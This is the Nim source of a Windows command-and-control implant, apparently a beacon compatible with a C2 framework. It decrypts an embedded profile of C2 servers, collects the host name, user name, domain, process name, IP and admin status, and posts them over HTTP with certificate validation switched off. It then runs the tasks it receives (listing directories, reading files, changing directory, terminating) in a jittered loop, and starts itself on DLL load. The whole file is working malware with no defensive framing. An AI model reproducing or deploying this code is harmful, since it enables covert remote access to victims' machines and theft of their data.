import std/[os, random, times, strutils]

const
  profileData = [byte PROFILE_PLACEHOLDER]
  profileSize = PROFILE_SIZE_PLACEHOLDER

type
  Config = object
    killDate, workingTime, sleepTime, jitter: int32
    listenerWatermark: uint32
    useSsl: bool
    hosts: seq[string]
    ports: seq[int32]
    httpMethod: string
    uris: seq[string]
    parameterName: string
    userAgents: seq[string]
    requestHeaders: string
    ansOffset1, ansOffset2: int32
    hostHeaders: seq[string]
    rotationMode: int32
    proxyType: int32
    proxyHost: string
    proxyPort: int32
    encryptKey: seq[byte]
    sessionKey: seq[byte]

  HINTERNET = pointer
  InAddr = object
    s_addr: uint32
  Hostent = object
    h_name: cstring
    h_aliases: pointer
    h_addrtype: int16
    h_length: int16
    h_addr_list: ptr ptr InAddr

const
  INTERNET_OPEN_TYPE_DIRECT = 1'u32
  INTERNET_OPEN_TYPE_PROXY = 3'u32
  INTERNET_SERVICE_HTTP = 3'u32
  INTERNET_FLAG_RELOAD = 0x80000000'u32
  INTERNET_FLAG_NO_CACHE_WRITE = 0x04000000'u32
  INTERNET_FLAG_SECURE = 0x00800000'u32
  INTERNET_FLAG_IGNORE_CERT_CN_INVALID = 0x00001000'u32
  INTERNET_FLAG_IGNORE_CERT_DATE_INVALID = 0x00002000'u32
  INTERNET_OPTION_SECURITY_FLAGS = 31'u32
  SECURITY_SET_MASK = 0x00000100'u32 or 0x00002000'u32 or 0x00001000'u32 or 0x00000200'u32

proc InternetOpenA(agent: cstring, accessType: uint32, proxy: cstring,
                   proxyBypass: cstring, flags: uint32): HINTERNET
                   {.importc, dynlib: "wininet", stdcall.}
proc InternetConnectA(hinet: HINTERNET, server: cstring, port: uint16,
                      user: cstring, pass: cstring, service: uint32,
                      flags: uint32, context: uint): HINTERNET
                      {.importc, dynlib: "wininet", stdcall.}
proc HttpOpenRequestA(hconn: HINTERNET, verb: cstring, path: cstring,
                      version: cstring, referrer: cstring,
                      acceptTypes: pointer, flags: uint32,
                      context: uint): HINTERNET
                      {.importc, dynlib: "wininet", stdcall.}
proc HttpSendRequestA(hreq: HINTERNET, headers: cstring, headersLen: uint32,
                      optional: pointer, optionalLen: uint32): int32
                      {.importc, dynlib: "wininet", stdcall.}
proc InternetReadFile(hFile: HINTERNET, buffer: pointer,
                      bytesToRead: uint32, bytesRead: ptr uint32): int32
                      {.importc, dynlib: "wininet", stdcall.}
proc InternetCloseHandle(h: HINTERNET): int32
                         {.importc, dynlib: "wininet", stdcall.}
proc InternetSetOptionA(h: HINTERNET, option: uint32, buffer: pointer,
                        bufLen: uint32): int32
                        {.importc, dynlib: "wininet", stdcall.}

proc GetCurrentProcessId(): uint32 {.importc, dynlib: "kernel32", stdcall.}
proc GetComputerNameA(buf: cstring, size: ptr uint32): int32 {.importc, dynlib: "kernel32", stdcall.}
proc GetUserNameA(buf: cstring, size: ptr uint32): int32 {.importc, dynlib: "advapi32", stdcall.}
proc GetModuleFileNameA(h: pointer, buf: cstring, size: uint32): uint32 {.importc, dynlib: "kernel32", stdcall.}
proc IsUserAnAdmin(): int32 {.importc, dynlib: "shell32", stdcall.}
proc WSAStartup(ver: uint16, data: pointer): int32 {.importc, dynlib: "ws2_32", stdcall.}
proc c_gethostname(name: cstring, len: int32): int32 {.importc: "gethostname", dynlib: "ws2_32", stdcall.}
proc c_gethostbyname(name: cstring): ptr Hostent {.importc: "gethostbyname", dynlib: "ws2_32", stdcall.}

proc rc4Crypt(data, key: openArray[byte]): seq[byte] =
  var s: array[256, byte]
  for i in 0..255: s[i] = byte(i)
  var j = 0
  for i in 0..255:
    j = (j + int(s[i]) + int(key[i mod key.len])) and 0xFF
    swap(s[i], s[byte(j)])
  result = newSeq[byte](data.len)
  var a, b = 0
  for k in 0..<data.len:
    a = (a + 1) and 0xFF
    b = (b + int(s[a])) and 0xFF
    swap(s[a], s[byte(b)])
    result[k] = data[k] xor s[(int(s[a]) + int(s[byte(b)])) and 0xFF]

proc readInt32LE(data: openArray[byte], pos: var int): int32 =
  if pos + 4 > data.len: return 0
  result = int32(data[pos]) or (int32(data[pos+1]) shl 8) or
           (int32(data[pos+2]) shl 16) or (int32(data[pos+3]) shl 24)
  pos += 4

proc readBoolByte(data: openArray[byte], pos: var int): bool =
  if pos >= data.len: return false
  result = data[pos] != 0
  pos += 1

proc readStringLE(data: openArray[byte], pos: var int): string =
  let length = readInt32LE(data, pos)
  if length <= 0 or pos + int(length) > data.len: return ""
  result = newString(length)
  for i in 0..<int(length): result[i] = char(data[pos + i])
  pos += int(length)
  result = result.strip(chars = {'\0'})

proc writeBE32(buf: var seq[byte], val: uint32) =
  buf.add byte((val shr 24) and 0xFF)
  buf.add byte((val shr 16) and 0xFF)
  buf.add byte((val shr 8) and 0xFF)
  buf.add byte(val and 0xFF)

proc writeBE16(buf: var seq[byte], val: uint16) =
  buf.add byte((val shr 8) and 0xFF)
  buf.add byte(val and 0xFF)

proc writeBE64(buf: var seq[byte], val: uint64) =
  buf.add byte((val shr 56) and 0xFF)
  buf.add byte((val shr 48) and 0xFF)
  buf.add byte((val shr 40) and 0xFF)
  buf.add byte((val shr 32) and 0xFF)
  buf.add byte((val shr 24) and 0xFF)
  buf.add byte((val shr 16) and 0xFF)
  buf.add byte((val shr 8) and 0xFF)
  buf.add byte(val and 0xFF)

proc writeBEBytes(buf: var seq[byte], data: openArray[byte]) =
  writeBE32(buf, uint32(data.len))
  for b in data: buf.add b

proc writeBEString(buf: var seq[byte], s: string) =
  var b = newSeq[byte](s.len + 1)
  for i in 0..<s.len: b[i] = byte(s[i])
  b[s.len] = 0
  writeBE32(buf, uint32(b.len))
  for byt in b: buf.add byt

proc getHostname(): string =
  var buf: array[256, char]
  var size = 256'u32
  if GetComputerNameA(cast[cstring](addr buf[0]), addr size) != 0:
    result = $cast[cstring](addr buf[0])

proc getUsername(): string =
  var buf: array[256, char]
  var size = 256'u32
  if GetUserNameA(cast[cstring](addr buf[0]), addr size) != 0:
    result = $cast[cstring](addr buf[0])

proc getDomain(): string =
  result = getEnv("USERDOMAIN")
  if result.len == 0: result = getHostname()

proc getProcessName(): string =
  var buf: array[260, char]
  let n = GetModuleFileNameA(nil, cast[cstring](addr buf[0]), 260)
  if n > 0:
    result = $cast[cstring](addr buf[0])
    let idx = result.rfind('\\')
    if idx >= 0: result = result[idx+1..^1]

proc getInternalIp(): uint32 =
  var wsaData: array[408, byte]
  discard WSAStartup(0x0202, addr wsaData[0])
  var hostname: array[256, char]
  if c_gethostname(cast[cstring](addr hostname[0]), 256) == 0:
    let he = c_gethostbyname(cast[cstring](addr hostname[0]))
    if he != nil and he.h_addr_list != nil:
      let addrPtr = he.h_addr_list[]
      if addrPtr != nil:
        return addrPtr.s_addr
  return 0x0100007F'u32

proc isElevated(): bool =
  result = IsUserAnAdmin() != 0

proc parseProfile(): Config =
  var pos = 0
  let encLen = readInt32LE(profileData, pos)
  var encData = newSeq[byte](encLen)
  for i in 0..<int(encLen): encData[i] = profileData[pos + i]
  pos += int(encLen)
  result.encryptKey = newSeq[byte](profileData.len - pos)
  for i in 0..<result.encryptKey.len: result.encryptKey[i] = profileData[pos + i]

  let decrypted = rc4Crypt(encData, result.encryptKey)
  var dpos = 0
  discard readInt32LE(decrypted, dpos) # agentWatermark
  result.killDate = readInt32LE(decrypted, dpos)
  result.workingTime = readInt32LE(decrypted, dpos)
  result.sleepTime = readInt32LE(decrypted, dpos)
  result.jitter = readInt32LE(decrypted, dpos)
  result.listenerWatermark = uint32(readInt32LE(decrypted, dpos))

  result.useSsl = readBoolByte(decrypted, dpos)
  let c2Count = readInt32LE(decrypted, dpos)
  for i in 0..<int(c2Count):
    result.hosts.add readStringLE(decrypted, dpos)
    result.ports.add readInt32LE(decrypted, dpos)
  result.httpMethod = readStringLE(decrypted, dpos)
  let uriCount = readInt32LE(decrypted, dpos)
  for i in 0..<int(uriCount): result.uris.add readStringLE(decrypted, dpos)
  result.parameterName = readStringLE(decrypted, dpos)
  let uaCount = readInt32LE(decrypted, dpos)
  for i in 0..<int(uaCount): result.userAgents.add readStringLE(decrypted, dpos)
  result.requestHeaders = readStringLE(decrypted, dpos)
  result.ansOffset1 = readInt32LE(decrypted, dpos)
  result.ansOffset2 = readInt32LE(decrypted, dpos)
  let hhCount = readInt32LE(decrypted, dpos)
  for i in 0..<int(hhCount): result.hostHeaders.add readStringLE(decrypted, dpos)
  result.rotationMode = readInt32LE(decrypted, dpos)
  result.proxyType = readInt32LE(decrypted, dpos)
  result.proxyHost = readStringLE(decrypted, dpos)
  result.proxyPort = readInt32LE(decrypted, dpos)
  discard readStringLE(decrypted, dpos) # proxy username
  discard readStringLE(decrypted, dpos) # proxy password

  result.sessionKey = newSeq[byte](16)
  for i in 0..<16: result.sessionKey[i] = byte(rand(255))

proc buildCheckin(config: Config): seq[byte] =
  var buf = newSeq[byte]()
  writeBE32(buf, uint32(config.sleepTime))
  writeBE32(buf, uint32(config.jitter))
  writeBE32(buf, uint32(config.killDate))
  writeBE32(buf, uint32(config.workingTime))
  writeBE16(buf, 0) # ACP
  writeBE16(buf, 0) # OemCP
  buf.add 0 # GMT offset

  let pid = GetCurrentProcessId()
  writeBE16(buf, uint16(pid and 0xFFFF))
  writeBE16(buf, 0) # TID

  writeBE32(buf, 19041'u32) # build number
  buf.add 10'u8 # major
  buf.add 0'u8  # minor
  writeBE32(buf, getInternalIp())

  var flags: byte = 0x01 or 0x02
  if isElevated(): flags = flags or 0x04
  buf.add flags

  writeBEBytes(buf, config.sessionKey)

  let domain = getDomain()
  var domainBytes = newSeq[byte](domain.len)
  for i in 0..<domain.len: domainBytes[i] = byte(domain[i])
  writeBEBytes(buf, domainBytes)

  let computer = getHostname()
  var compBytes = newSeq[byte](computer.len)
  for i in 0..<computer.len: compBytes[i] = byte(computer[i])
  writeBEBytes(buf, compBytes)

  let username = getUsername()
  var userBytes = newSeq[byte](username.len)
  for i in 0..<username.len: userBytes[i] = byte(username[i])
  writeBEBytes(buf, userBytes)

  let procName = getProcessName()
  var procBytes = newSeq[byte](procName.len)
  for i in 0..<procName.len: procBytes[i] = byte(procName[i])
  writeBEBytes(buf, procBytes)
  return buf

proc httpPost(config: Config, data: openArray[byte], currentHost: var int): seq[byte] =
  if config.hosts.len == 0: return @[]

  var idx: int
  if config.rotationMode == 1:
    idx = rand(config.hosts.len - 1)
  else:
    idx = currentHost
  currentHost = (currentHost + 1) mod config.hosts.len

  let host = config.hosts[idx]
  let port = config.ports[idx]
  let uri = if config.uris.len > 0: config.uris[rand(config.uris.len - 1)] else: "/"
  let ua = if config.userAgents.len > 0: config.userAgents[rand(config.userAgents.len - 1)] else: "Mozilla/5.0"
  let verb = if config.httpMethod.len > 0: config.httpMethod else: "POST"

  let hInet = InternetOpenA(cstring(ua), INTERNET_OPEN_TYPE_DIRECT, nil, nil, 0)
  if hInet == nil: return @[]

  let hConn = InternetConnectA(hInet, cstring(host), uint16(port), nil, nil,
                               INTERNET_SERVICE_HTTP, 0, 0)
  if hConn == nil:
    discard InternetCloseHandle(hInet)
    return @[]

  var flags = INTERNET_FLAG_RELOAD or INTERNET_FLAG_NO_CACHE_WRITE
  if config.useSsl:
    flags = flags or INTERNET_FLAG_SECURE or INTERNET_FLAG_IGNORE_CERT_CN_INVALID or
            INTERNET_FLAG_IGNORE_CERT_DATE_INVALID

  let hReq = HttpOpenRequestA(hConn, cstring(verb), cstring(uri), nil, nil, nil, flags, 0)
  if hReq == nil:
    discard InternetCloseHandle(hConn)
    discard InternetCloseHandle(hInet)
    return @[]

  if config.useSsl:
    var secFlags = SECURITY_SET_MASK
    discard InternetSetOptionA(hReq, INTERNET_OPTION_SECURITY_FLAGS,
                               addr secFlags, uint32(sizeof(secFlags)))

  var headers = "Content-Type: application/octet-stream\r\n"
  if config.requestHeaders.len > 0:
    headers &= config.requestHeaders.replace("\n", "\r\n")
    if not headers.endsWith("\r\n"): headers &= "\r\n"

  var sendResult: int32
  if data.len > 0:
    sendResult = HttpSendRequestA(hReq, cstring(headers), uint32(headers.len),
                                  unsafeAddr data[0], uint32(data.len))
  else:
    sendResult = HttpSendRequestA(hReq, cstring(headers), uint32(headers.len), nil, 0)

  if sendResult == 0:
    discard InternetCloseHandle(hReq)
    discard InternetCloseHandle(hConn)
    discard InternetCloseHandle(hInet)
    return @[]

  var body = newSeq[byte]()
  var readBuf: array[4096, byte]
  var bytesRead: uint32 = 0
  while true:
    if InternetReadFile(hReq, addr readBuf[0], uint32(readBuf.len), addr bytesRead) == 0: break
    if bytesRead == 0: break
    for i in 0..<int(bytesRead): body.add readBuf[i]

  discard InternetCloseHandle(hReq)
  discard InternetCloseHandle(hConn)
  discard InternetCloseHandle(hInet)

  if config.ansOffset1 > 0 or config.ansOffset2 > 0:
    let startIdx = int(config.ansOffset1)
    let endIdx = body.len - int(config.ansOffset2)
    if endIdx > startIdx: return body[startIdx..<endIdx]
  return body

proc executeCommand(commandId: int32, data: openArray[byte], pos: var int): seq[byte] =
  var buf = newSeq[byte]()
  case commandId
  of 4: # PWD
    let pwd = getCurrentDir()
    writeBE32(buf, uint32(commandId))
    writeBEString(buf, pwd)
  of 22: # GETUID
    let username = getUsername()
    let domain = getDomain()
    let elevated = isElevated()
    writeBE32(buf, uint32(commandId))
    buf.add (if elevated: 1'u8 else: 0'u8)
    writeBEString(buf, domain)
    writeBEString(buf, username)
  of 8: # CD
    let path = readStringLE(data, pos)
    try:
      setCurrentDir(path)
      let newDir = getCurrentDir()
      writeBE32(buf, uint32(commandId))
      writeBEString(buf, newDir)
    except: return @[]
  of 24: # CAT
    let path = readStringLE(data, pos)
    try:
      var content = readFile(path)
      if content.len > 2048: content = content[0..<2048]
      writeBE32(buf, uint32(commandId))
      writeBEString(buf, path)
      var contentBytes = newSeq[byte](content.len)
      for i in 0..<content.len: contentBytes[i] = byte(content[i])
      writeBEBytes(buf, contentBytes)
    except: return @[]
  of 14: # LS
    let dirPath = readStringLE(data, pos)
    try:
      type DirEntry = tuple[name: string, isDir: bool, size: int64, modified: uint32]
      var entries: seq[DirEntry] = @[]
      for kind, path in walkDir(dirPath):
        let info = getFileInfo(path)
        let isDir = kind == pcDir
        let size = if isDir: 0'i64 else: info.size
        let modified = uint32(info.lastWriteTime.toUnix())
        entries.add (extractFilename(path), isDir, size, modified)
      writeBE32(buf, uint32(commandId))
      buf.add 1'u8
      writeBEString(buf, dirPath)
      writeBE32(buf, uint32(entries.len))
      for entry in entries:
        buf.add (if entry.isDir: 1'u8 else: 0'u8)
        writeBE64(buf, uint64(entry.size))
        writeBE32(buf, entry.modified)
        writeBEString(buf, entry.name)
    except:
      writeBE32(buf, uint32(commandId))
      buf.add 0'u8
      writeBE32(buf, 2'u32)
  of 10: # TERMINATE
    let termType = readInt32LE(data, pos)
    if termType == 2: quit(0)
    return @[]
  else: return @[]
  return buf

proc processTasks(config: Config, data: openArray[byte]): seq[byte] =
  if data.len < 4: return @[]
  var pos = 0
  discard readInt32LE(data, pos)
  var inner = newSeq[byte]()
  while pos + 8 <= data.len:
    var taskId = newSeq[byte](4)
    for i in 0..3: taskId[i] = data[pos + i]
    pos += 4
    let commandId = readInt32LE(data, pos)
    let cmdResult = executeCommand(commandId, data, pos)
    if cmdResult.len > 0:
      for b in taskId: inner.add b
      for b in cmdResult: inner.add b
  if inner.len == 0: return @[]
  var final_result = newSeq[byte]()
  writeBE32(final_result, uint32(inner.len + 4))
  for b in inner: final_result.add b
  return final_result

proc beaconMain() =
  randomize()
  var config = parseProfile()

  let beat = buildCheckin(config)
  let encBeat = rc4Crypt(beat, config.encryptKey)

  var payload = newSeq[byte]()
  writeBE32(payload, config.listenerWatermark)
  for b in encBeat: payload.add b

  var currentHost = 0

  while true:
    let response = httpPost(config, payload, currentHost)
    if response.len > 0:
      let decResponse = rc4Crypt(response, config.sessionKey)
      let taskResult = processTasks(config, decResponse)
      if taskResult.len > 0:
        payload = rc4Crypt(taskResult, config.sessionKey)
      else:
        payload = @[]
    else:
      payload = @[]

    var sleepMs = int(config.sleepTime) * 1000
    if config.jitter > 0:
      sleepMs += rand(sleepMs * int(config.jitter) div 100)
    sleep(sleepMs)

    if config.killDate > 0:
      let now = int32(epochTime())
      if now >= config.killDate: return

when appType == "lib":
  type LPTHREAD_START_ROUTINE = proc(param: pointer): uint32 {.stdcall.}
  proc CreateThread(attr: pointer, stackSize: uint, startAddr: LPTHREAD_START_ROUTINE,
                    param: pointer, flags: uint32, threadId: ptr uint32): pointer
                    {.importc, dynlib: "kernel32", stdcall.}
  proc beaconThreadProc(param: pointer): uint32 {.stdcall.} =
    beaconMain()
    return 0
  discard CreateThread(nil, 0, beaconThreadProc, nil, 0, nil)
elif isMainModule:
  beaconMain()
